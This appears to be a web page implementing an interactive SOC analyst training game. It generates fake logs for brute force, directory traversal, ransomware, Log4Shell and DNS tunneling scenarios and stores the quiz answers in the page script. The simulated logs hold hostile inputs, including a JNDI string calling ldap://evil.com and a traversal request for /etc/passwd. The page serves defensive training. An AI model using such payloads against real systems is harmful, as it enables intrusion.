---
layout: page
title: "SentinelGuard Expert Cyber Range"
permalink: /labs/station/
---

<style>
    /* GLOBAL RESET */
    html, body, main { background-color: #010409 !important; color: #c9d1d9 !important; margin: 0 !important; padding: 0 !important; width: 100%; height: 100%; overflow: hidden; }
    #desktop-environment {
        background: radial-gradient(circle, #0d1117 0%, #010409 100%);
        height: 100vh; width: 100vw; position: relative; overflow: hidden; font-family: 'JetBrains Mono', monospace; z-index: 1;
    }
    #taskbar { background: rgba(22, 27, 34, 0.98); height: 40px; border-top: 1px solid #30363d; display: flex; align-items: center; padding: 0 15px; gap: 20px; z-index: 999; position: absolute; bottom: 0; left: 0; width: 100%; pointer-events: auto; }
    .window { position: absolute; top: 48%; left: 50%; transform: translate(-50%, -50%); width: 96%; height: 85%; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; box-shadow: 0 30px 60px rgba(0,0,0,0.9); display: flex; flex-direction: column; z-index: 100; pointer-events: auto; }
    .window-header { background: #161b22; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #30363d; }
    .close-btn { color: #f85149; cursor: pointer; font-size: 20px; font-weight: bold; }
    .lab-content { display: flex; flex: 1; overflow: hidden; padding: 15px; gap: 15px; }
    #log-screen { flex: 1; overflow-y: scroll; padding: 15px; font-size: 11px; color: #8b949e; line-height: 1.8; background: #010409; border: 1px solid #30363d; white-space: pre-wrap; border-radius: 4px; }
    .question-panel { flex: 0.4; background: #161b22; padding: 15px; border-radius: 6px; border: 1px solid #30363d; overflow-y: auto; }
    .btn-action { background: #238636; border: none; color: white; padding: 12px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.2s; }
    .btn-action:hover { background: #2ea043; }
    .input-field { width: 100%; background: #0d1117; border: 1px solid #30363d; color: #58a6ff; padding: 10px; margin-top: 5px; border-radius: 5px; outline: none; font-size: 12px; }
    .correct-ans { border-color: #238636 !important; background: rgba(35, 134, 54, 0.1) !important; }
    .wrong-ans { border-color: #f85149 !important; background: rgba(248, 81, 73, 0.1) !important; }
    .hidden { display: none !important; }
    .modal-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; display: flex; justify-content: center; align-items: center; }
    .custom-modal { background: #161b22; border: 1px solid #58a6ff; padding: 30px; border-radius: 12px; text-align: center; max-width: 500px; border-top: 5px solid #58a6ff; }
</style>

<div id="desktop-environment">
    <div id="system-modal" class="modal-overlay hidden">
        <div class="custom-modal">
            <h2 id="modal-title" style="color: #58a6ff;">STATION ALERT</h2>
            <div id="modal-body" style="margin: 20px 0; font-size: 13px; color: #e6edf3;"></div>
            <button onclick="closeModal()" class="btn-action">ACKNOWLEDGE</button>
        </div>
    </div>

    <div style="position: absolute; top: 20px; left: 20px; display: flex; flex-direction: column; gap: 25px; z-index: 10;">
        <div onclick="openWindow('auth-window')" style="width: 85px; text-align: center; cursor: pointer; padding: 10px; border-radius: 8px;">
            <img src="https://cdn-icons-png.flaticon.com/512/3233/3233514.png" width="45">
            <span style="font-size: 10px; color: #fff;">Login.sys</span>
        </div>
        <div id="range-icon" class="hidden" onclick="openWindow('selection-window')" style="width: 85px; text-align: center; cursor: pointer; padding: 10px; border-radius: 8px;">
            <img src="https://cdn-icons-png.flaticon.com/512/906/906343.png" width="45">
            <span style="font-size: 10px; color: #fff;">CyberRange.exe</span>
        </div>
    </div>

    <div id="auth-window" class="window">
        <div class="window-header"><span>Analyst Identification</span><span onclick="closeWindow('auth-window')" class="close-btn">×</span></div>
        <div style="padding: 60px; text-align: center; max-width: 400px; margin: 0 auto;">
            <h3 style="color: #58a6ff;">SECURE ACCESS</h3>
            <input type="text" id="alias-input" class="input-field" placeholder="Enter Alias...">
            <br><br>
            <button onclick="loginAnalyst()" class="btn-action">INITIALIZE</button>
        </div>
    </div>

    <div id="selection-window" class="window hidden">
        <div class="window-header"><span>Mission Control</span><span onclick="closeWindow('selection-window')" class="close-btn">×</span></div>
        <div id="selection-content" style="padding: 25px; overflow-y: auto;">
            <h4 style="color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 10px;">AVAILABLE MISSIONS</h4>
            <div id="machine-list" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; margin-top: 20px;"></div>
        </div>
        <div id="briefing-content" class="hidden" style="padding: 25px; overflow-y: auto;">
            <h2 id="brief-lab-name" style="color: #58a6ff;">BRIEFING</h2>
            <div id="brief-details" style="background: rgba(88,166,255,0.05); border: 1px solid #30363d; padding: 20px; border-radius: 8px; margin: 20px 0; font-size: 13px;"></div>
            <div style="display: flex; gap: 15px;">
                <button onclick="hideBriefing()" class="btn-action" style="background:#30363d; width: 150px;">BACK</button>
                <button onclick="startInvestigation()" class="btn-action">GO LIVE</button>
            </div>
        </div>
    </div>

    <div id="lab-window" class="window hidden">
        <div class="window-header"><span id="lab-title-text">Investigation Unit</span><span onclick="closeWindow('lab-window')" class="close-btn">×</span></div>
        <div class="lab-content">
            <div style="flex: 1; display: flex; flex-direction: column;">
                <div style="background:#161b22; padding:5px 15px; font-size:10px; border-bottom: 1px solid #30363d;">RAW TELEMETRY STREAM (EXPERT_MODE)</div>
                <div id="log-screen"></div>
            </div>
            <div class="question-panel">
                <h4 style="color:#f85149; margin-top:0; font-size: 14px;">Artifacts</h4>
                <div id="q-area"></div>
                <button onclick="checkAnswers()" class="btn-action" style="margin-top: 15px;">SUBMIT EVIDENCE</button>
            </div>
        </div>
    </div>

    <div id="playbook-window" class="window hidden">
        <div class="window-header"><span>Decision Center</span><span onclick="closeWindow('playbook-window')" class="close-btn">×</span></div>
        <div style="padding: 30px; overflow-y: auto;">
            <h2 style="color: #3fb950; margin-top: 0;">REMEDIATION PLAYBOOK</h2>
            <div id="playbook-ui"></div>
        </div>
    </div>

    <div id="taskbar">
        <div id="clock" style="font-size: 11px; color: #8b949e;">00:00:00</div>
        <div id="active-user" style="margin-left: auto; font-size: 10px; color: #58a6ff;">GUEST@STATION</div>
    </div>
</div>

<script>
    // GENERIC LOG GENERATOR FOR NOISE
    function generateNoise(count, type) {
        let noise = [];
        const ips = ["10.0.0.5", "192.168.1.15", "172.16.0.10", "10.0.0.22", "192.168.1.100"];
        const users = ["jsmith", "mgarcia", "tlee", "bwhite", "akhan"];
        const files = ["/index.php", "/assets/style.css", "/js/main.js", "/images/logo.png", "/contact.html"];
        
        for(let i=0; i<count; i++) {
            let time = `[14:${Math.floor(Math.random()*59)}:${Math.floor(Math.random()*59)}]`;
            if(type === 'win') {
                noise.push(`${time} INFO Audit: EventID=4624 source=${ips[Math.floor(Math.random()*ips.length)]} user=${users[Math.floor(Math.random()*users.length)]} status=Success`);
            } else {
                noise.push(`${time} INFO Web: ${ips[Math.floor(Math.random()*ips.length)]} GET ${files[Math.floor(Math.random()*files.length)]} 200`);
            }
        }
        return noise;
    }

    const labs = {
        brute: {
            name: "ADV-01: Stealthy Brute Force", diff: "Easy",
            details: "Detect unauthorized account access. Note: Attacker is using a 'Low-and-Slow' method.",
            questions: [{q: "Attacker IP?", a: "141.10.22.5"}, {q: "Compromised User?", a: "svc_web"}],
            logs: () => {
                let l = generateNoise(150, 'win');
                l.splice(Math.floor(Math.random()*100), 0, `[14:40:05] WARN Audit: EventID=4625 source=141.10.22.5 user=svc_web status=Failure`);
                l.splice(Math.floor(Math.random()*100), 0, `[14:42:15] WARN Audit: EventID=4625 source=141.10.22.5 user=svc_web status=Failure`);
                l.splice(Math.floor(Math.random()*100), 0, `[14:45:01] CRIT Audit: EventID=4624 source=141.10.22.5 user=svc_web status=Success`);
                return l;
            },
            remedy: "reset --user svc_web"
        },
        traversal: {
            name: "ADV-02: Directory Traversal", diff: "Medium",
            details: "Identify attempts to access restricted system files via web parameters.",
            questions: [{q: "Attacker IP?", a: "192.168.55.12"}, {q: "Targeted File?", a: "/etc/passwd"}],
            logs: () => {
                let l = generateNoise(180, 'web');
                // False Leads
                l.push(`[10:12:00] INFO Web: 192.168.55.1 GET /index.php 200`);
                l.push(`[10:14:05] INFO Web: 192.168.55.12 GET /assets/style.css 200`);
                // Actual Attack
                l.splice(Math.floor(Math.random()*150), 0, `[10:15:22] WARN Web: 192.168.55.12 GET /download.php?file=../../../../etc/passwd 200`);
                return l;
            },
            remedy: "isolate --host web-srv-01"
        },
        ransom: {
            name: "ADV-03: Ransomware Execution", diff: "Hard",
            details: "Detect malicious file system activity and C2 callback.",
            questions: [{q: "Process Name?", a: "wannacry.exe"}, {q: "Extension?", a: ".wnry"}],
            logs: () => {
                let l = generateNoise(120, 'win');
                l.splice(40, 0, `[08:05:01] CRIT Sysmon: EventID=1 Image="wannacry.exe" Parent="cmd.exe"`);
                l.splice(60, 0, `[08:06:40] WARN Network: Connection to 203.0.113.42:4444 Established`);
                l.splice(80, 0, `[08:07:15] ALERT FileSystem: Target="Report.pdf.wnry" Status="Encrypted"`);
                return l;
            },
            remedy: "isolate --host finance-pc"
        },
        log4j: {
            name: "ADV-04: Log4Shell Exploitation", diff: "Expert",
            details: "Detect JNDI injection attempts in application headers.",
            questions: [{q: "Attacker IP?", a: "88.99.100.101"}, {q: "LDAP URI?", a: "ldap://evil.com/a"}],
            logs: () => {
                let l = generateNoise(200, 'web');
                l.splice(120, 0, `[22:05:12] CRIT Apache: 88.99.100.101 UA: \${jndi:ldap://evil.com/a}`);
                l.splice(130, 0, `[22:06:00] ALERT IDS: Outbound LDAP connection detected`);
                return l;
            },
            remedy: "service stop tomcat"
        },
        exfil: {
            name: "ADV-05: DNS Tunneling", diff: "Expert",
            details: "Identify data exfiltration via encoded DNS queries.",
            questions: [{q: "Source Host?", a: "DESKTOP-AF2"}, {q: "Rogue Domain?", a: "dns-tunnel.com"}],
            logs: () => {
                let l = generateNoise(250, 'web'); // DNS uses web-like IPs here for simplicity
                for(let i=0; i<30; i++) {
                    l.splice(Math.floor(Math.random()*l.length), 0, `[11:10:${i<10?'0'+i:i}] WARN DNS: query ${Math.random().toString(36).substring(5)}.dns-tunnel.com from DESKTOP-AF2`);
                }
                return l;
            },
            remedy: "block-domain dns-tunnel.com"
        }
    };

    let userAlias = ""; let currentKey = "";
    function openWindow(id) { document.querySelectorAll('.window').forEach(w => w.classList.add('hidden')); document.getElementById(id).classList.remove('hidden'); }
    function closeWindow(id) { document.getElementById(id).classList.add('hidden'); }
    function openModal(title, body) { document.getElementById('modal-title').innerText = title; document.getElementById('modal-body').innerHTML = body; document.getElementById('system-modal').classList.remove('hidden'); }
    function closeModal() { document.getElementById('system-modal').classList.add('hidden'); }

    function loginAnalyst() {
        const val = document.getElementById('alias-input').value.trim();
        if(!val) return;
        userAlias = val;
        document.getElementById('range-icon').classList.remove('hidden');
        document.getElementById('active-user').innerText = `${val.toUpperCase()}@STATION`;
        closeWindow('auth-window');
        openModal("SUCCESS", `Session initialized for ${val}. Cyber Range online.`);
        renderSelection();
    }

    function renderSelection() {
        const container = document.getElementById('machine-list');
        container.innerHTML = Object.keys(labs).map(key => `
            <div onclick="showBriefing('${key}')" style="background:#161b22; border:1px solid #30363d; padding:20px; border-radius:10px; cursor:pointer; font-weight:bold;">
                <span style="color:#fff;">${labs[key].name}</span>
                <span style="font-size:9px; color:#58a6ff; float:right; border:1px solid #58a6ff; padding:2px 5px; border-radius:4px;">${labs[key].diff}</span>
            </div>
        `).join('');
    }

    function showBriefing(key) { currentKey = key; document.getElementById('selection-content').classList.add('hidden'); document.getElementById('briefing-content').classList.remove('hidden'); document.getElementById('brief-lab-name').innerText = labs[key].name; document.getElementById('brief-details').innerHTML = labs[key].details; }
    function hideBriefing() { document.getElementById('selection-content').classList.remove('hidden'); document.getElementById('briefing-content').classList.add('hidden'); }

    function startInvestigation() {
        closeWindow('selection-window'); openWindow('lab-window');
        const lab = labs[currentKey];
        document.getElementById('log-screen').innerHTML = lab.logs().map(l => `<div style="border-bottom:1px solid #161b22; padding:3px 0;">${l}</div>`).join('');
        document.getElementById('q-area').innerHTML = lab.questions.map((q, i) => `<div style="margin-bottom:10px;"><label style="font-size:10px; color:#8b949e;">${q.q}</label><input type="text" id="ans-${i}" class="input-field"></div>`).join('');
    }

    function checkAnswers() {
        const lab = labs[currentKey]; let correct = 0;
        lab.questions.forEach((q, i) => { if(document.getElementById(`ans-${i}`).value.trim().toLowerCase() === q.a.toLowerCase()) { correct++; document.getElementById(`ans-${i}`).className="input-field correct-ans"; } else { document.getElementById(`ans-${i}`).className="input-field wrong-ans"; } });
        if(correct === lab.questions.length) { openModal("VERIFIED", "Artifacts confirmed. Enter Remediation."); setTimeout(() => { closeWindow('lab-window'); openWindow('playbook-window'); renderPlaybook(); }, 1500); }
    }

    function renderPlaybook() {
        document.getElementById('playbook-ui').innerHTML = `
            <div style="background:rgba(88,166,255,0.05); padding:20px; border-radius:8px;">
                <label style="font-size:12px; color:#58a6ff;">Final Classification</label>
                <select id="case-decision" class="input-field" onchange="toggleActions()" style="margin-bottom:15px;">
                    <option value="tp">True Positive (Escalate to L2)</option>
                    <option value="fp">False Positive (Close Incident)</option>
                </select>
                <div id="tp-action-area">
                    <p style="font-size:11px; color:#f85149;">EDR Action: ${labs[currentKey].remedy}</p>
                    <div class="edr-terminal"><div id="edr-out">[READY]</div><input type="text" id="edr-in" onkeydown="handleEDR(event)" style="background:none; border:none; color:#3fb950; outline:none; width:100%;"></div>
                    <button onclick="finalize('tp')" class="btn-action" style="margin-top:15px; background:#d29922;">ESCALATE TO TIER-2</button>
                </div>
                <div id="fp-action-area" class="hidden">
                    <button onclick="finalize('fp')" class="btn-action" style="margin-top:15px;">CLOSE AS FALSE POSITIVE</button>
                </div>
                <textarea id="analyst-note" class="input-field" style="height:60px; margin-top:15px;" placeholder="Analyst summary..."></textarea>
            </div>`;
    }

    function toggleActions() { const val = document.getElementById('case-decision').value; document.getElementById('tp-action-area').className = val==='tp' ? '' : 'hidden'; document.getElementById('fp-action-area').className = val==='fp' ? '' : 'hidden'; }
    function handleEDR(e) { if(e.key === "Enter") { document.getElementById('edr-out').innerHTML += `<div>$ ${e.target.value}</div><div style="color:#3fb950;">[OK] Executed.</div>`; e.target.value = ""; } }
    function finalize(type) { if(!document.getElementById('analyst-note').value) { alert("Note required."); return; } openModal("DONE", type==='tp' ? "Escalated." : "Closed."); setTimeout(()=>location.reload(), 3000); }
    setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
</script>
